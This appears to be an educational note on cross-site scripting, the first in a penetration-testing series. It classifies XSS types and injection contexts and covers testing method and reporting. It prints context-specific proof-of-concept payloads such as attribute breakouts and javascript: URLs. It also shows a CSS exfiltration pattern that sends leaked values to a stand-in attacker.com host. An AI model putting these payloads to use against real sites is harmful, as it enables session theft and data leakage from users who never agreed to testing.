# 01 — XSS Overview & Classification

## Where XSS Fits in OWASP Top 10

Cross-Site Scripting (XSS) lives under **A03:2021 - Injection** in the OWASP Top 10. It is grouped with SQL Injection, Command Injection, and others because the root cause is identical in shape: **untrusted input is interpreted as code/markup by a parser instead of being treated as inert data.**

The difference from SQLi:
- SQLi → untrusted input is interpreted by the **database engine's SQL parser**.
- XSS → untrusted input is interpreted by the **victim's browser** (HTML parser, JS engine, CSS engine, or URL parser), and the "attacker" payload runs in the security context of a **different user's session** — not the server's.

This is the single most important conceptual difference to carry into every XSS engagement: **the server is just the delivery mechanism; the actual exploitation happens inside someone else's browser, using their cookies/session/permissions.** This is why XSS impact assessment always asks "who views this page, and what can their session do?" rather than "what can the database do?"

## The Core Mechanism (Why XSS Works At All)

Browsers parse HTML, then within HTML they switch parsing modes depending on context: regular text, an attribute value, an inline `<script>` block, a `style` block, or a URL scheme (`href`, `src`). If the application places user input directly into the page's HTML/JS/CSS source **without correctly encoding it for the specific context it lands in**, an attacker can break out of the intended context and inject new HTML tags, new attributes, or new JavaScript statements.

There is no single "XSS payload" — there is only **context-appropriate injection**. A payload that works in a plain HTML body context will usually do nothing inside a `<script>` block, and vice versa. This is why this note series treats injection contexts as a first-class topic (file 01 here, contexts explained below; deep payload mechanics expanded per-type in files 02-04).

## Classification Axis 1: By Data Flow (Where the malicious script comes from / how it reaches the victim)

### Reflected XSS
The payload is part of the HTTP request (URL parameter, form field, header) and the server reflects it back **unencoded, in the same response**, with no persistence. The victim must be tricked into clicking a crafted link or submitting a crafted form — there is no storage step.

- **Persistence:** None. Exists only for the duration of that one request/response.
- **Delivery to victim:** Requires social engineering — phishing link, malicious `<a>` on another site, etc.
- **Typical sources:** Search boxes, error messages ("no results for `<input>`"), redirect parameters echoed into the page.

### Stored (Persistent) XSS
The payload is submitted once, saved server-side (database, file, log, message queue — anywhere persisted), and then served back to **any user** who later views the page containing that stored data. No per-victim link crafting needed; the application itself becomes the delivery vector.

- **Persistence:** Survives across sessions/requests until the underlying data is deleted/sanitized.
- **Delivery to victim:** Automatic — any user (or admin) who loads the page is hit.
- **Typical sources:** Comments, profile fields (bio, display name), support tickets, product reviews, chat messages, file metadata (EXIF, filenames).
- **Why it's rated more severe than Reflected:** No interaction-per-victim required, and it can hit privileged users (admins/moderators) who view user-submitted content as part of their normal workflow — this is the basis for Blind XSS (file 05).

### DOM-based XSS
The vulnerability lives **entirely client-side**. The payload may never even touch the server in a way the server-side code processes — instead, client-side JavaScript reads attacker-controlled data from a **source** (e.g., `location.hash`, `document.referrer`, `window.name`, `postMessage` data) and writes it into a dangerous **sink** (e.g., `innerHTML`, `document.write()`, `eval()`) without sanitization. The server's HTTP response can be byte-for-byte identical for every user — the vulnerability is purely in how the page's own JS handles the DOM.

- **Persistence:** None inherently, but can be combined with Stored sinks (e.g., a stored value later read by vulnerable client JS).
- **Why it's tested separately:** Server-side WAFs and server-side output encoding are **completely blind** to this class, because the malicious data flow never crosses through server-side rendering. You must read the JavaScript itself (source → sink tracing) to find it; black-box request/response fuzzing alone often misses it.
- Covered in depth, including source/sink catalog and DOM clobbering, in file `04_DOM_Based_XSS.md`.

### Blind XSS
Not a different injection mechanism — it's a **detection-difficulty subclass** of Stored XSS. The payload fires in a context the attacker cannot directly observe: an admin dashboard, a back-office support ticket viewer, a log analysis tool, a "contact us" message reviewed internally. The tester has no direct view of execution, so detection relies on **out-of-band (OOB) callbacks** — the payload, when it executes, makes an outbound HTTP request to an attacker-controlled listener (Burp Collaborator, a webhook, or a custom server), proving execution occurred even though the tester never sees the rendered page.

- Covered in full, including Collaborator/webhook setup, in file `05_Blind_XSS.md`.

### Mutation XSS (mXSS)
A payload that is **inert/safe as submitted**, but becomes dangerous after being **parsed and re-serialized** by the browser's HTML parser or by a sanitizer's own parse-and-rewrite step. The classic case: a sanitizer (e.g., an older DOMPurify configuration, or `innerHTML` round-tripping) parses input into a DOM tree and then serializes it back to a string — and the serialization step itself introduces new, exploitable markup that wasn't present in the original sanitized output. This happens because HTML parsing and serialization are not perfectly symmetric (e.g., certain malformed-but-parseable sequences inside `<noscript>`, `<svg>`, `<math>`, or attributes get "corrected" into different, executable markup on re-parse).

- mXSS is rare to find manually without parser-internals knowledge; it's primarily a sanitizer-bypass class. Detailed mechanism walkthroughs are in file `04_DOM_Based_XSS.md` since mXSS is almost always discovered through DOM/sink analysis rather than simple reflection testing.

## Classification Axis 2: By Injection Context (Where exactly in the page the payload lands)

This axis matters **independently** of the Reflected/Stored/DOM axis above — any of those three delivery mechanisms can place a payload into any of these five contexts. Context determines syntax; delivery mechanism determines how the payload reaches the victim and how persistent it is.

### 1. HTML Context (raw body text)
Input is placed between tags, e.g. `<p>USER_INPUT</p>`. If unencoded, you can simply inject new tags:
```
<script>alert(document.domain)</script>
```
- `<script>` opens a new script-parsing context (browser stops treating it as HTML text and starts executing it as JS).
- `alert(document.domain)` — calling `document.domain` rather than a hardcoded string is an industry convention: it proves the script executed *in the origin of the vulnerable page* (not a copy/cached/sandboxed version), which matters for report credibility.
- `</script>` closes the JS execution block so the rest of the page doesn't break (though browsers are often forgiving even without this).

If `<script>` itself is filtered, any HTML element with an event-handler attribute or auto-firing behavior is an alternative — these are covered as their own context below since the execution trigger is an *attribute*, not the tag itself.

### 2. HTML Attribute Context
Input lands inside an attribute value, e.g. `<input value="USER_INPUT">`. Here, injecting a `<script>` tag is usually pointless — you're not inside element content, you're inside a quoted string. You need to **break out of the attribute** first:
```
" autofocus onfocus=alert(document.domain) x="
```
- `"` closes the `value="..."` attribute that contained your input.
- `autofocus` is a boolean HTML attribute that makes the browser automatically focus this element on page load with no user interaction required.
- `onfocus=alert(document.domain)` is an event-handler attribute — when the element receives focus (triggered automatically by `autofocus`), the browser executes the JS in this attribute.
- `x="` is a dummy attribute-open that "soaks up" whatever literal trailing quote the original template was going to append after your input (e.g. if the source is `value="USER_INPUT"`, your injected `x="` pairs with that trailing `"` so the resulting HTML stays syntactically valid and doesn't break page rendering, which could otherwise hide the proof-of-concept or break the rest of the page in a way that gets the payload stripped by a recovery parser).

If quotes are filtered/encoded but the attribute is **unquoted** (`value=USER_INPUT`), a space alone breaks out, since unquoted attribute values end at whitespace:
```
x onmouseover=alert(1)
```

### 3. JavaScript Context (inside an existing `<script>` block, e.g. inside a JS string literal)
Input lands inside server-rendered JS, e.g.:
```html
<script>var search = "USER_INPUT";</script>
```
Here you don't need new tags — you're already inside script execution. You need to **terminate the string and the statement**, inject your own statement, then **neutralize the rest of the line** so it doesn't throw a syntax error that could stop your payload from running (in some parsing situations) or just looks messy in the report:
```
";alert(document.domain);//
```
- `"` closes the string literal that was holding your input.
- `;` ends the (now empty/broken) original statement cleanly.
- `alert(document.domain);` is your injected statement.
- `//` comments out everything the template was going to append after your input on that line (e.g. the closing `";` from the original code), preventing a leftover syntax error.

If the input lands inside a JS context but **outside any quotes** (e.g., directly into a numeric-looking template like `var id = USER_INPUT;`), you don't need the leading `"` — you'd go straight to `;alert(document.domain);//`.

### 4. URL Context (`href`, `src`, or any attribute taking a URL)
Two distinct sub-cases:
- **Attribute-breakout case:** identical mechanics to HTML Attribute Context above — if you can fully break out of the `href="..."` attribute, you can inject a new attribute (`onfocus=...` etc.) exactly as in section 2.
- **Scheme-injection case:** if you only control the URL *value itself* (can't break the attribute, e.g. strict allowlisting prevents adding new attributes but the scheme is unchecked), you can supply the `javascript:` pseudo-protocol:
```
javascript:alert(document.domain)
```
  - The browser, when this URL is **navigated to** (e.g. the user clicks the link, or it's an `<a>` with this as `href` and is clicked — note `<img src="javascript:...">` does **not** execute this way; the `javascript:` scheme only fires on navigation-type contexts, not `src`-as-resource-fetch contexts), evaluates everything after `javascript:` as a JS expression instead of fetching a resource.
  - This is why context matters even within "URL context" — `javascript:` works in `href`, `formaction`, `action`; it does **not** reliably work in `src` of an `<img>`/`<script>` tag because those are resource-fetch contexts, not navigation contexts.

### 5. CSS Context (inside a `<style>` block or a `style="..."` attribute)
Modern browsers have largely closed off CSS as a *direct* JS-execution vector (old IE-only tricks like `expression()` are dead). Today, CSS-context "XSS" is more accurately described in two ways:
- **Data exfiltration via CSS, not code execution:** attribute selectors combined with `background: url(https://attacker.com/?leak=...)` can be used to exfiltrate values character-by-character (commonly used against CSRF tokens or password fields rendered in the DOM) — this is a real, current technique, detailed with full mechanism breakdown in file `09_Exploitation_Impact.md` since it's an *impact/exfiltration* technique rather than a way to get initial JS execution.
- **Breaking out of a `style` attribute into a new HTML attribute,** which is really just HTML Attribute Context (section 2) — e.g. `style="color:red" onload=alert(1) x="`.

Treat "CSS context" primarily as a **data-exfiltration channel** for blind/no-JS scenarios, not as a code-execution context in current browsers — this is an important distinction to get right in a report so you don't overstate severity.

## Methodology: A Repeatable Testing Process

1. **Find every reflection/storage point.** Map every place user input appears in: URL params, POST bodies, headers (`User-Agent`, `Referer`, `X-Forwarded-For`), cookies, file uploads (filenames, EXIF/metadata, SVG content), WebSocket messages.
2. **Determine context for each reflection.** View source / inspect the DOM to see *exactly* where your marker string lands — HTML body, an attribute, inside a script, inside a URL, inside CSS. Use a unique, grep-able marker (e.g. `zzXSSTEST12345zz`) before trying any payload, purely to locate context.
3. **Determine delivery mechanism (Reflected / Stored / DOM).** Does it survive a page reload from a *different* request (Stored)? Does it require client-side JS to process it at all, or is it server-rendered (DOM vs Reflected/Stored)?
4. **Probe encoding/filtering behavior.** Submit each "dangerous" character individually (`<`, `>`, `"`, `'`, `/`, backtick) and observe what survives — encoded, stripped, passed through unchanged, or substituted. This single-character probing step is the foundation for every bypass technique in file `07_Filter_WAF_Bypass_Encoding.md`.
5. **Craft a context-correct PoC.** Start with the minimal payload that proves execution (`alert(document.domain)` is the industry-standard PoC because it's unambiguous and harmless), then escalate to impact-demonstrating payloads only as needed for the report (file `09`).
6. **Check CSP.** Before assuming any payload will execute, check the `Content-Security-Policy` response header — and if present, treat CSP bypass as its own sub-task (file `06`), since a textbook payload can be syntactically perfect and still be blocked entirely by policy.
7. **Document and assess real impact**, not just "JS executed." See report-writing notes below.

## Real-World Engagement Notes

- **Most real findings are Reflected or Stored in attribute/JS contexts, not the textbook `<script>alert(1)</script>` in HTML body** — modern frameworks (React, Vue, Angular) auto-escape HTML-body interpolation by default, but developers routinely punch holes in that protection via `dangerouslySetInnerHTML`, `v-html`, `[innerHTML]` bindings, or manual DOM APIs — which is exactly DOM-based XSS territory (file 04).
- **CSP presence does not mean "not vulnerable."** A huge fraction of real CSP deployments are misconfigured (`unsafe-inline`, overly broad `script-src` host allowlists, missing `object-src`/`base-uri`) — always test CSP bypass even when the header is present, before downgrading severity.
- **Severity is about reachable impact, not "did alert() fire."** A reflected XSS only reachable via a POST-only parameter that requires CSRF token (no GET equivalent, no auto-submitting form trick) is lower-impact than the same payload reachable via a plain GET link, because exploitability/deliverability differs hugely. Note this explicitly in reports.
- **Self-XSS is not a vulnerability** unless you can demonstrate a path to make it affect *another* user (e.g. chained with CSRF to force the victim to submit the payload into their own profile, which is then viewed by an admin — that *is* reportable, but the chain must be explicit).

## Common Mistakes (Junior-Tester Pitfalls)

- Testing only `<script>alert(1)</script>` and concluding "not vulnerable" when the real context needed an attribute-breakout or event-handler payload.
- Confusing **reflected in source** with **executed in browser** — always verify in an actual rendered page/DOM, not just by viewing raw HTTP response text, since browsers and `curl` parse HTML very differently.
- Ignoring `Content-Type` of the response — a JSON API response with `Content-Type: application/json` reflecting your payload is **not directly exploitable as XSS** unless something else (e.g. a JSONP callback, or the JSON being later rendered unsafely) turns it into a browser-parsed HTML context.
- Forgetting DOM-based XSS exists because "the server-side code looked clean" — always grep client-side JS bundles for dangerous sinks regardless of server-side findings.

## Report-Writing Considerations (Applies Across All Files in This Series)

- State the **injection context** and **delivery mechanism** explicitly and separately in every finding (e.g. "Stored XSS, HTML attribute context, via the profile `bio` field").
- Include the **exact unencoded payload**, the **exact request** that delivers it, and a **screenshot or video of the PoC firing in a browser** (not just a curl response).
- State CSP status (present/absent, and if present, why it didn't block the PoC).
- State realistic impact in business terms (e.g. "an attacker can steal session cookies of any user who views this comment, resulting in full account takeover") rather than just "executes arbitrary JavaScript."

---
**Next:** `02_Reflected_XSS.md`
